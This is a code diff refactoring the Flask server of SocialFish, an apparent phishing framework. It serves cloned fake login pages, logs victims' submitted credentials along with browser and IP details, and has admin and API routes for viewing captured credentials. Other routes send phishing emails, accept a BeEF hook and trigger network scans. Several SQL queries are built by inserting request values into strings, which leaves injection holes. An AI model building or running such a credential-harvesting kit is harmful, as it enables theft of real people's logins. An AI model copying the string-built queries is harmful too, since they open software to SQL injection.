@@ -45,12 +45,9 @@ def teardown_request(exception):
 
 # Conta o numero de credenciais salvas no banco
 def countCreds():
-    count = 0
     cur = g.db
     select_all_creds = cur.execute("SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc")
-    for i in select_all_creds:
-        count += 1
-    return count
+    return sum(1 for _ in select_all_creds)
 
 # Conta o numero de visitantes que nao foram pegos no phishing
 def countNotPickedUp():
@@ -102,12 +99,9 @@ def request_loader(request):
 # Rota para o caminho de inicializacao, onde e possivel fazer login
 @app.route('/neptune', methods=['GET', 'POST'])
 def admin():
-    # se a requisicao for get
     if request.method == 'GET':
-        # se o usuario estiver logado retorna para a pagina de credenciais
         if flask_login.current_user.is_authenticated:
             return redirect('/creds')
-        # caso contrario retorna para a pagina de login
         else:
             return render_template('signin.html')
 
@@ -115,18 +109,15 @@ def admin():
     if request.method == 'POST':
         email = request.form['email']
         try:
-            # caso sejam corretas
-            if request.form['password'] == users[email]['password']:
-                user = User()
-                user.id = email
-                # torna autentico
-                flask_login.login_user(user)
-                # retorna acesso a pagina restrita
-                return redirect('/creds')
-            # contrario retorna erro
-            else:
+            if request.form['password'] != users[email]['password']:
                 # temporario
                 return "bad"
+            user = User()
+            user.id = email
+            # torna autentico
+            flask_login.login_user(user)
+            # retorna acesso a pagina restrita
+            return redirect('/creds')
         except:
             return "bad"
 
@@ -141,12 +132,10 @@ def getLogin():
         cur = g.db
         cur.execute("UPDATE socialfish SET clicks = clicks + 1 where id = 1")
         g.db.commit()
-        template_path = 'fake/{}/{}/index.html'.format(agent, o)
+        template_path = f'fake/{agent}/{o}/index.html'
         return render_template(template_path)
-    # caso seja a url padrao
     elif url == 'https://github.com/UndeadSec/SocialFish':
         return render_template('default.html')
-    # caso seja configurada para custom
     else:
         cur = g.db
         cur.execute("UPDATE socialfish SET clicks = clicks + 1 where id = 1")
@@ -157,7 +146,7 @@ def getLogin():
 @app.route('/login', methods=['POST'])
 def postData():
     if request.method == "POST":
-        fields = [k for k in request.form]
+        fields = list(request.form)
         values = [request.form[k] for k in request.form]
         data = dict(zip(fields, values))
         browser = str(request.user_agent.browser)
@@ -180,16 +169,12 @@ def echo():
     sta = request.form['status']
     beef = request.form['beef']
 
-    if sta == 'clone':
-        url = request.form['url']
-    else:
-        url = 'Custom'
-
+    url = request.form['url'] if sta == 'clone' else 'Custom'
     if len(url) > 4 and len(red) > 4:
         if 'http://' not in url and sta != '1' and 'https://' not in url:
-            url = 'http://' + url
+            url = f'http://{url}'
         if 'http://' not in red and 'https://' not in red:
-            red = 'http://' + red
+            red = f'http://{red}'
     else:
         url = 'https://github.com/UndeadSec/SocialFish'
         red = 'https://github.com/UndeadSec/SocialFish'
@@ -229,9 +214,9 @@ def getMail():
         port = request.form['port']
         sendMail(subject, email, password, recipient, body, smtp, port)
         cur = g.db
-        cur.execute("UPDATE sfmail SET email = '{}' where id = 1".format(email))
-        cur.execute("UPDATE sfmail SET smtp = '{}' where id = 1".format(smtp))
-        cur.execute("UPDATE sfmail SET port = '{}' where id = 1".format(port))
+        cur.execute(f"UPDATE sfmail SET email = '{email}' where id = 1")
+        cur.execute(f"UPDATE sfmail SET smtp = '{smtp}' where id = 1")
+        cur.execute(f"UPDATE sfmail SET port = '{port}' where id = 1")
         g.db.commit()
         return redirect('/mail')
 
@@ -240,7 +225,7 @@ def getMail():
 @flask_login.login_required
 def getSingleCred(id):
     try:
-        sql = "SELECT jdoc FROM creds where id = {}".format(id)
+        sql = f"SELECT jdoc FROM creds where id = {id}"
         cur = g.db
         credInfo = cur.execute(sql).fetchall()
         if len(credInfo) > 0:
@@ -273,7 +258,7 @@ def revokeToken():
     revoke = request.form['revoke']
     if revoke == 'yes':
         cur = g.db
-        upsql = "UPDATE socialfish SET token = '{}' where id = 1".format(genToken())
+        upsql = f"UPDATE socialfish SET token = '{genToken()}' where id = 1"
         cur.execute(upsql)
         g.db.commit()
         token = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
@@ -367,10 +352,7 @@ def unauthorized_handler():
 def checkKey(key):
     cur = g.db
     tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
-    if key == tokenapi:
-        status = {'status':'ok'}
-    else:
-        status = {'status':'bad'}
+    status = {'status':'ok'} if key == tokenapi else {'status':'bad'}
     return jsonify(status)
 
 @app.route("/api/statistics/<key>", methods=['GET'])
@@ -428,13 +410,17 @@ def postConfigureApi():
                 sta = 'custom'
                 url = 'Custom'
 
-            if url != 'Custom':
-                if len(url) > 4:
-                    if 'http://' not in url and sta != '1' and 'https://' not in url:
-                        url = 'http://' + url
+            if (
+                url != 'Custom'
+                and len(url) > 4
+                and 'http://' not in url
+                and sta != '1'
+                and 'https://' not in url
+            ):
+                url = f'http://{url}'
             if len(red) > 4:
                 if 'http://' not in red and 'https://' not in red:
-                    red = 'http://' + red
+                    red = f'http://{red}'
             else:
                 red = 'https://github.com/UndeadSec/SocialFish'
             cur = g.db
@@ -463,9 +449,9 @@ def postSendMail():
             port = content['port']
             if sendMail(subject, email, password, recipient, body, smtp, port) == 'ok':
                 cur = g.db
-                cur.execute("UPDATE sfmail SET email = '{}' where id = 1".format(email))
-                cur.execute("UPDATE sfmail SET smtp = '{}' where id = 1".format(smtp))
-                cur.execute("UPDATE sfmail SET port = '{}' where id = 1".format(port))
+                cur.execute(f"UPDATE sfmail SET email = '{email}' where id = 1")
+                cur.execute(f"UPDATE sfmail SET smtp = '{smtp}' where id = 1")
+                cur.execute(f"UPDATE sfmail SET port = '{port}' where id = 1")
                 g.db.commit()
                 status = {'status':'ok'}
             else:
@@ -497,32 +483,26 @@ def getScanSfMob(key, ip):
     tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
     if key == tokenapi:
         return jsonify(nScan(ip))
-    else:
-        content = {'status':'bad'}
-        return jsonify(content)
+    content = {'status':'bad'}
+    return jsonify(content)
 
 @app.route("/api/infoReport/<key>", methods=['GET'])
 def getReportMob(key):
     cur = g.db
     tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
-    if key == tokenapi:
-        urls = cur.execute("SELECT url FROM creds").fetchall()
-        users = cur.execute("SELECT name FROM professionals").fetchall()
-        comp = cur.execute("SELECT name FROM companies").fetchall()
-        uniqueUrls = []
-        professionals = []
-        companies = []
-        for c in comp:
-            companies.append(c[0])
-        for p in users:
-            professionals.append(p[0])
-        for u in urls:
-            if u not in uniqueUrls:
-                uniqueUrls.append(u[0])
-        info = {'urls':uniqueUrls,'professionals':professionals, 'companies':companies}
-        return jsonify(info)
-    else:
+    if key != tokenapi:
         return jsonify({'status':'bad'})
+    urls = cur.execute("SELECT url FROM creds").fetchall()
+    users = cur.execute("SELECT name FROM professionals").fetchall()
+    comp = cur.execute("SELECT name FROM companies").fetchall()
+    uniqueUrls = []
+    companies = [c[0] for c in comp]
+    professionals = [p[0] for p in users]
+    for u in urls:
+        if u not in uniqueUrls:
+            uniqueUrls.append(u[0])
+    info = {'urls':uniqueUrls,'professionals':professionals, 'companies':companies}
+    return jsonify(info)
 
 #--------------------------------------------------------------------------------------------------------------------------------
 def main():
